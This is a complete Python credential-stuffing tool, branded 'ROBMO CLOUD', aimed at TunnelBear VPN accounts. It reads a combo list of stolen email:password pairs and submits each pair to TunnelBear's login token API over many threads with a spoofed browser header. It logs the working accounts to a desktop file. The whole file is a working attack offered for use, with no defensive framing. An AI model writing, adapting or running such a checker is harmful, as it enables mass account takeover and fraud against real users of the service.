import os
import signal
import concurrent.futures
import time
import sys
import requests
import uuid
import tkinter as tk
from tkinter import filedialog
from colorama import Fore, init
from pathlib import Path
import json
import shutil
from pystyle import *

init()
os.system("cls")

ROBMO = "═══════ • 𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃 • ════════"


def center(text, color):
    terminal_width = shutil.get_terminal_size().columns
    for line in text.split('\n'):
        centered_text = line.center(terminal_width)
        sys.stdout.write(color + centered_text + Fore.RESET + '\n')

def Banner():
    os.system('cls' if os.name=='nt' else 'clear')
    banner_text = f"""{Fore.RED}



████████╗██╗░░░██╗███╗░░██╗███╗░░██╗███████╗██╗░░░░░
╚══██╔══╝██║░░░██║████╗░██║████╗░██║██╔════╝██║░░░░░
░░░██║░░░██║░░░██║██╔██╗██║██╔██╗██║█████╗░░██║░░░░░
░░░██║░░░██║░░░██║██║╚████║██║╚████║██╔══╝░░██║░░░░░
░░░██║░░░╚██████╔╝██║░╚███║██║░╚███║███████╗███████╗
░░░╚═╝░░░░╚═════╝░╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚══════╝


██████╗░███████╗░█████╗░██████╗░
██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╦╝█████╗░░███████║██████╔╝
██╔══██╗██╔══╝░░██╔══██║██╔══██╗
██████╦╝███████╗██║░░██║██║░░██║
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
                                                                        

"""

    os.system('cls' if os.name=='nt' else 'clear')
    center(banner_text, Fore.RED)
    time.sleep(2)

Banner()

def p_consola(email, password, success):
    if success:
        print(Fore.GREEN + f"\n\n     [+] Success: {email}:{password}")
    else:
        print(Fore.RED + f"\n\n     [!] Failure: {email}:{password}")

def save_result(email, password, success):
    with open(success_file, 'a', encoding="utf-8") as success:
        success.write(f"{email}:{password}\n")
        success.write(f"\n{ROBMO}\n\n")
    

def select_file():
    root = tk.Tk()
    root.withdraw()  

    file_path = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text Files", "*.txt")])
    if not file_path:
        os.system('cls' if os.name=='nt' else 'clear')
        Write.Print("\n\n     [•]  Selected File: FALSE", Colors.red)
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        return select_file()
    else:
        file_name = os.path.basename(file_path)
        with open(file_path, "r", encoding="latin") as file:
            total_lines = len(file.readlines())
        Banner()
        Write.Print("\n\n     [•]  Selected File: TRUE", Colors.blue)
        time.sleep(2)
        Write.Print(f"\n\n     [•]  File Name: {file_name}", Colors.blue)
        time.sleep(2)
        Write.Print(f"\n\n     [•]  Total Lines: {total_lines}", Colors.blue)
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        return file_path

def generate_guid(email, password):
    uid = "browser-" + str(uuid.uuid4())
    url = "https://prod-api-dashboard.tunnelbear.com/dashboard/web/v2/token"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.0;) AppleWebKit/600.9 (KHTML, like Gecko) Chrome/53.0.2939.302 Safari/600.5 Edge/12.58079",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Origin": "https://www.tunnelbear.com/",
        "Referer": "https://www.tunnelbear.com/"
    }
    data = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "device": uid
    }
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 200:
        json_data = response.json()
        access_token = json_data.get("access_token")
        return access_token
    else:
        return None

def handle_interrupt(signum, frame):
    print(Fore.RED + "\n\n     [!] Program interrupted.")
    exit(0)

good_count = 0
os.system(f"title TunnelBear")

def check_credentials(line):
    global good_count

file_path = select_file()  
Banner()
Write.Print("\n\n     Enter threads", Colors.blue)
num_threads = int(input(Fore.BLUE + "\n\n     [-]: "))
os.system('cls' if os.name == 'nt' else 'clear')
time.sleep(2)
Banner()
success_folder = Path(f'C:/Users/{os.getlogin()}/Desktop/𝐏𝐚𝐬𝐬𝐓𝐫𝐚𝐜𝐤𝐞𝐫 ™/𝐆𝐎𝐎𝐃')
success_folder.mkdir(parents=True, exist_ok=True)
success_file = success_folder / "[𝐓.𝐁][𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃].txt"
signal.signal(signal.SIGINT, handle_interrupt)
signal.signal(signal.SIGTERM, handle_interrupt)

try:
    with open(file_path, 'r') as file:
        lines = file.readlines()

    def process_combo(line):
        combo = line.strip().split(":")
        if len(combo) == 2:
            email, password = combo
            access_token = generate_guid(email, password)
            if access_token:
                p_consola(email, password, success=True)
                save_result(email, password, success=True)
                global good_count
                good_count += 1
            else:
                p_consola(email, password, success=False)
                save_result(email, password, success=False)
        else:
            print(Fore.YELLOW + f"\n\n     [!] Invalid combo format: {line.strip()}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(process_combo, lines)
    
    time.sleep(5)

except FileNotFoundError:
    print(Fore.RED + f"\n\n     [!] File not found: {file_path}")
    time.sleep(5)
    sys.exit(5)

except Exception as e:
    pass